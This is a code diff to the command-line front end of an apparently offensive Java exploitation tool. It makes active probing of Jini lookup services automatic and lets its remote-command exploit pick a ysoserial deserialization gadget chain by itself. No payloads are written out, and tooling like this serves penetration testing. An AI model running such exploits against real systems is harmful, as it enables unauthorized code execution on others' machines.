@@ -45,7 +45,7 @@ def _scan_cmd_json(
     port: int,
     timeout: float,
     no_codebase: bool,
-    tier2: bool = False,
+    skip_tier2: bool = False,
     jini_classpath: str | None = None,
 ) -> None:
     """JSON-mode path for scan_cmd — collects everything then emits one blob."""
@@ -80,6 +80,17 @@ def _scan_cmd_json(
         dgc_result = probe.probe_dgc(target, port)
     except JavaPwnerError:
         pass
+
+    # Tier 2 — Active Registrar Inspection (automatic when prerequisites are met)
+    if not skip_tier2 and scan_result.has_unicast_response:
+        try:
+            from javapwner.core.jvm_bridge import JvmBridge
+            cp_list = jini_classpath.split(":") if jini_classpath else None
+            bridge = JvmBridge(classpath=cp_list, timeout=timeout + 25.0)
+            if not bridge.check_prerequisites():
+                enumerator.enumerate_tier2(target, port, bridge, enum_result)
+        except (JvmBridgeError, JavaPwnerError):
+            pass  # Missing prereqs — skip silently in JSON mode
 
     assessment = assess_exploitation(
         version_hints=enum_result.java_version_hints,
@@ -121,15 +132,15 @@ def jini() -> None:
               metavar="PORT", help="TCP port of the Jini lookup service.")
 @click.option("--no-codebase", is_flag=True, default=False,
               help="Skip HTTP codebase server exploitation.")
-@click.option("--tier2", is_flag=True, default=False,
-              help="Run Tier 2 active Registrar inspection via JVM bridge. "
-                   "Requires JDK + Jini/River JARs.")
+@click.option("--no-tier2", "skip_tier2", is_flag=True, default=False,
+              help="Skip Tier 2 active Registrar inspection (JVM bridge). "
+                   "Tier 2 runs automatically when JDK + Jini/River JARs are available.")
 @click.option("--classpath", "jini_classpath", default=None, metavar="CP",
               help="Jini/River JAR classpath (colon-separated). "
                    "Also reads JINI_CLASSPATH env var.")
 @click.pass_context
 def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
-             tier2: bool, jini_classpath: str | None) -> None:
+             skip_tier2: bool, jini_classpath: str | None) -> None:
     """Full Jini/Reggie enumeration — scan + enumerate + probe + codebase exploit.
 
     This is the main reconnaissance command.  It combines all enumeration
@@ -141,7 +152,7 @@ def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
       3. Deep serial analysis (class descriptors, annotations, SUID, paths)
       4. Embedded JRMP endpoint detection and confirmation
       5. HTTP codebase server probing (directory listing, path traversal, file read)
-      6. [--tier2] Active Registrar inspection via JVM bridge (admin, services)
+      6. Active Registrar inspection via JVM bridge (auto — requires JDK + Jini/River JARs)
     """
     fmt = _get_fmt(ctx)
     timeout = _get_timeout(ctx)
@@ -149,7 +160,7 @@ def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
     # In JSON mode we must collect everything first and emit one atomic blob.
     if fmt.json_mode:
         _scan_cmd_json(ctx, fmt, target, port, timeout, no_codebase,
-                       tier2=tier2, jini_classpath=jini_classpath)
+                       skip_tier2=skip_tier2, jini_classpath=jini_classpath)
         return
 
     # ── Phase 1: TCP + JRMP + Unicast Discovery ──────────────────────────────
@@ -339,8 +350,8 @@ def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
                         if cls_info.field_names:
                             fmt.info(f"      fields   : {', '.join(cls_info.field_names[:10])}")
 
-    # ── Phase 4b: Tier 2 — Active Registrar Inspection (optional) ──────────
-    if tier2:
+    # ── Phase 4b: Tier 2 — Active Registrar Inspection (automatic) ──────────
+    if not skip_tier2 and scan_result.has_unicast_response:
         fmt.section("Phase 4b — Tier 2: Active Registrar Inspection (JVM bridge)")
         try:
             from javapwner.core.jvm_bridge import JvmBridge
@@ -353,7 +364,7 @@ def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
             if issues:
                 for issue in issues:
                     fmt.warning(issue)
-                fmt.error("Tier 2 prerequisites not met — skipping.")
+                fmt.warning("Tier 2 prerequisites not met — skipping (use --no-tier2 to suppress).")
             else:
                 with fmt.status("Connecting to Jini Lookup Service via JVM bridge…"):
                     reg_info = enumerator.enumerate_tier2(
@@ -396,16 +407,9 @@ def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool,
                             for iface in svc.interfaces[:5]:
                                 fmt.debug(f"    implements {iface}")
         except JvmBridgeError as exc:
-            fmt.error(f"Tier 2 failed: {exc}")
+            fmt.warning(f"Tier 2 skipped: {exc}")
         except JavaPwnerError as exc:
-            fmt.error(f"Tier 2 error: {exc}")
-    else:
-        # Show heuristic admin hint if applicable
-        if enum_result.registrar_info and enum_result.registrar_info.is_administrable:
-            fmt.info(
-                "Heuristic: Registrar appears Administrable. "
-                "Use --tier2 for active inspection."
-            )
+            fmt.warning(f"Tier 2 skipped: {exc}")
 
     # ── Phase 5: Exploitation Assessment ────────────────────────────────────
     fmt.section("Phase 5 — Exploitation Assessment")
@@ -543,8 +547,9 @@ def _url_base(url: str) -> str | None:
 @jini.command("exploit")
 @click.option("-t", "--target", required=True, metavar="HOST")
 @click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
-@click.option("--gadget", required=True, metavar="NAME",
-              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
+@click.option("--gadget", required=False, default=None, metavar="NAME",
+              help="ysoserial gadget chain name (e.g. CommonsCollections6). "
+                   "Auto-detected if omitted.")
 @click.option("--cmd", "command", required=True, metavar="CMD",
               help="Shell command to execute on the target.")
 @click.option("--jep290-probe", "jep290_probe", is_flag=True, default=False,
@@ -552,9 +557,13 @@ def _url_base(url: str) -> str | None:
 @click.option("--dns-url", default=None, metavar="URL",
               help="DNS callback URL for --jep290-probe (requires OOB listener).")
 @click.pass_context
-def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str,
+def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str | None,
                 command: str, jep290_probe: bool, dns_url: str | None) -> None:
-    """Deliver a ysoserial deserialization payload via JRMP DGC dirty call."""
+    """Deliver a ysoserial deserialization payload via JRMP DGC dirty call.
+
+    When --gadget is omitted the tool probes the target's classpath to find a
+    compatible gadget chain automatically (same detection logic as 'rmi scan').
+    """
     fmt = _get_fmt(ctx)
     timeout = _get_timeout(ctx)
     jar = _get_ysoserial(ctx)
@@ -577,9 +586,29 @@ def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str,
         else:
             fmt.warning("JEP290 probe: filter detected — exploitation may fail.")
 
-    fmt.info(f"Exploiting {target}:{port} with gadget '{gadget}' → {command!r}")
+    if gadget is None:
+        # Auto mode: probe compatible gadgets then exploit with the first one
+        fmt.info(f"No gadget specified — probing compatible gadgets on {target}:{port}…")
+        with fmt.status("Detecting compatible gadgets…"):
+            compatible, result = exploiter.auto_exploit(target, port, command)
 
-    result = exploiter.exploit(target, port, gadget, command)
+        if not compatible:
+            fmt.error(
+                "No compatible gadgets found. "
+                "The target may have JEP290 filters active or an unsupported classpath. "
+                "Try --gadget with a specific chain or --jep290-probe."
+            )
+            sys.exit(1)
+
+        fmt.info(f"Compatible gadgets: {', '.join(compatible)}")
+        fmt.info(f"Using: {compatible[0]}")
+    else:
+        fmt.info(f"Exploiting {target}:{port} with gadget '{gadget}' → {command!r}")
+        result = exploiter.exploit(target, port, gadget, command)
+
+    if result is None:
+        fmt.error("Exploit did not produce a result.")
+        sys.exit(1)
 
     if fmt.json_mode:
         fmt.print_json(result.to_dict())
